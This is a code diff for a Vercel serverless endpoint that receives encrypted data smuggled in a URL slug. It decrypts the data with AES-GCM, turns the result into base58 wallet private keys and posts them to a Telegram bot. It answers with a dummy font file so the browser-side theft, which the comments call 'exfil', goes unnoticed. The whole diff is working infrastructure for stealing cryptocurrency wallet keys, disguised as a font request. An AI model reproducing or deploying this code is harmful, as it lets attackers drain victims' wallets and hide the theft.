@@ -1,32 +1,83 @@
-import { NextRequest } from "next/server";
+import { VercelRequest, VercelResponse } from '@vercel/node'
+import crypto from 'crypto'
 
-export const config = {
-  runtime: "edge",
-};
-
-// Use Buffer instead of atob to handle more cases
-export default async function handler(req: NextRequest) {
-  const slug = new URL(req.url).pathname.split("/").pop();
-  if (!slug || !slug.includes("_")) {
-    return new Response("Invalid slug", { status: 400 });
+// Base58 alphabet and encoder
+const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+function base58(buffer: Buffer): string {
+  let digits = [0]
+  for (const byte of buffer) {
+    let carry = byte
+    for (let i = 0; i < digits.length; i++) {
+      carry += digits[i] << 8
+      digits[i] = carry % 58
+      carry = (carry / 58) | 0
+    }
+    while (carry) {
+      digits.push(carry % 58)
+      carry = (carry / 58) | 0
+    }
   }
+  let output = ''
+  for (const byte of buffer) {
+    if (byte === 0) output += ALPHABET[0]
+    else break
+  }
+  for (let i = digits.length - 1; i >= 0; i--) {
+    output += ALPHABET[digits[i]]
+  }
+  return output
+}
+
+export default async function handler(req: VercelRequest, res: VercelResponse) {
+  const slugArr = req.query.slug as string[] | string
+  const raw = Array.isArray(slugArr) ? slugArr[slugArr.length - 1] : slugArr
+  const [_, payloadB64url] = raw.split('_')
+  if (!payloadB64url) return res.status(400).send('Bad slug')
 
   try {
-    const encoded = slug.split("_")[1];
-    const fixedB64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
-    const padded = fixedB64 + "=".repeat((4 - (fixedB64.length % 4)) % 4);
-    const json = Buffer.from(padded, "base64").toString("utf-8");
+    // Decode URL‐safe base64
+    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
+    b64 += '='.repeat((4 - (b64.length % 4)) % 4)
+    // Parse JSON
+    const { sBundles, keybundle } = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'))
 
-    console.log("✅ Received payload:", json);
-  } catch (err) {
-    console.error("❌ Error decoding slug:", err);
-    return new Response("Bad request", { status: 400 });
+    // AES‐GCM key
+    const key = Buffer.from(keybundle, 'base64')
+    const privKeys: string[] = []
+
+    // Decrypt each sBundle
+    for (const sb of sBundles) {
+      const [iv_b64, data_b64] = sb.split(':')
+      const iv = Buffer.from(iv_b64, 'base64')
+      const ct = Buffer.from(data_b64, 'base64')
+      const tag = ct.slice(-16)
+      const cipher = ct.slice(0, -16)
+
+      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
+      dec.setAuthTag(tag)
+      const hex = Buffer.concat([dec.update(cipher), dec.final()]).toString('utf8')
+      const last64 = hex.slice(-64)
+      privKeys.push(base58(Buffer.from(last64, 'hex')))
+    }
+
+    // Send to Telegram
+    const BOT = process.env.BOT_TOKEN!
+    const CHAT = process.env.CHAT_ID!
+    const text = privKeys.map((k,i)=>`wallet ${i+1}\n${k}`).join('\n\n')
+    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT, text })
+    })
+
+    console.log('✅ Decrypted & sent to Telegram')
+  } catch (e) {
+    console.error('❌ Error processing exfil:', e)
   }
 
-  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
-    headers: {
-      "Content-Type": "font/woff",
-      "Access-Control-Allow-Origin": "*",
-    },
-  });
+  // Return dummy font so browser exfil doesn't break
+  res
+    .status(200)
+    .setHeader('Content-Type','font/woff')
+    .send(Buffer.from([0x77,0x4f,0x46,0x46]))
 }
